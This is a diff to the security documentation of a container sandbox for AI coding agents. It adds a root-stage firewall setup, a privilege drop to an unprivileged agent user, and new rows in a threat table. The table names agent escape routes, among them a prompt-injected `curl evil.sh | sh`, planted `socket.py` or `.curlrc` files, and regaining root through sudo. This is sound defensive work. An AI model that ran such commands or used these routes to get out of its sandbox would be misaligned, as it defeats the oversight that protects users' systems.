@@ -137,7 +137,9 @@ container" guidance.
 ## Network Firewall
 
 When the firewall is enabled by default, `init-firewall.sh` runs as root inside
-the container and:
+the container, before the agent starts (see
+[Privileged setup and privilege drop](#privileged-setup-and-privilege-drop)),
+and:
 
 - Sets `iptables` and `ip6tables` policies to DROP.
 - Pre-resolves allowlisted domains using the resolvers in `/etc/resolv.conf`,
@@ -224,6 +226,53 @@ Customize:
   see `docs/usage.md` for the runtime matrix and Apple setup. `--ollama-model` overrides the
   default model list.
 
+### Privileged setup and privilege drop
+
+Agent sessions start as root, but only for the image's root stage
+(`/usr/local/bin/project-sandbox-init`, the image `ENTRYPOINT`). The launcher
+passes `--user 0:0` on Docker, Podman and Apple `container`; the image's own
+`USER` stays `agent`, so the image never starts as root outside project-sandbox.
+The root stage:
+
+1. changes to `/` and sets a fixed `PATH`;
+2. unless `--no-firewall` is set, runs the firewall script under
+   `env -i PATH=<fixed> HOME=/root`. No variable from the container
+   environment reaches it, including `BASH_ENV`, `ENV` and `PYTHON*`. If the
+   firewall fails, the container exits non-zero and the session command never
+   starts;
+3. drops to the `agent` user with
+   `setpriv --reuid --regid --init-groups --inh-caps=-all --ambient-caps=-all --bounding-set=-all --no-new-privs`
+   and execs `project-sandbox-entrypoint`, which changes back to `/workspace`.
+   The entrypoint, and then the agent, stay PID 1.
+
+The firewall script protects itself as well: it changes to `/` first, runs its
+Python helpers (endpoint resolution and the Internet-proxy preflight) as
+`python3 -I`, which ignores the current directory and `PYTHON*` variables, and
+calls `curl -q`, which ignores `.curlrc`. The script reads no environment
+variable: every setting is rendered into it. So a repository, or an earlier
+session in a persistent workspace, cannot plant `/workspace/ipaddress.py`,
+`socket.py` or a `.curlrc` that runs as root.
+
+After the drop, the session has no capabilities, an empty capability bounding
+set and `no_new_privs`, so setuid binaries such as `sudo` are inert, and no
+image contains a sudoers rule. The agent cannot change the firewall rules, and
+nothing in the session can re-run firewall initialization: earlier versions let
+the agent re-run it through `sudo` at any time. To change the firewall, start a
+new session.
+
+A host `exec` into a running session without `--user` runs as root on Docker,
+Podman and Apple `container`, because they reuse the `--user 0:0` the container
+was started with.
+Use `exec --user agent` for an agent shell with the dropped privileges.
+
+Images built before this privilege model have the old entrypoint, which would
+run the agent itself as root under `--user 0:0`. Normal launches rebuild them
+(the rendered Dockerfile changed). With `--no-build`, the launch reads the
+image's `org.project-sandbox.privilege-model` label with a read-only
+`image inspect` and refuses an image without `root-stage-v1`, asking you to
+rebuild. `--dry-run --no-build` names the label it would require without
+inspecting the image.
+
 ## Devcontainer
 
 `project-sandbox --devcontainer` renders a test and debug environment, not an
@@ -296,6 +345,8 @@ The devcontainer is rendered only on request; launches never rewrite it.
 | Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist with default DROP and domain whitelist for both IPv4 and IPv6. |
 | DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
+| Repository or earlier session plants `ipaddress.py`, `socket.py` or a `.curlrc` in the workspace to run code as root during firewall setup | The root stage runs the firewall from `/` with `env -i`; the script's Python helpers run as `python3 -I` and `curl` as `curl -q`. |
+| Agent re-runs firewall initialization or regains root during a session | No sudoers rule exists; the root stage drops to `agent` with no capabilities, an empty bounding set and `no_new_privs` before the session command starts. |
 | Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
 | Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
@@ -538,8 +589,9 @@ parts that matter for security:
   outbound TCP only to the sidecar endpoint (`host.docker.internal` on
   `[egress.sidecar] port`, default 3129) and to this session's local services
   or remote agent proxy, drops DNS, and fails closed when it cannot enforce
-  IPv6. The agent runs without root, so it cannot change those rules, and
-  `--no-firewall` is rejected in this mode.
+  IPv6. The agent runs without root, capabilities or any sudo rule (see
+  [Privileged setup and privilege drop](#privileged-setup-and-privilege-drop)),
+  so it cannot change those rules, and `--no-firewall` is rejected in this mode.
 - **No routing isolation over firewall mode.** Sidecar mode filters by
   hostname, but it does not add network isolation beyond firewall mode: if the
   sandbox firewall failed, the sandbox could reach the network directly. Clients
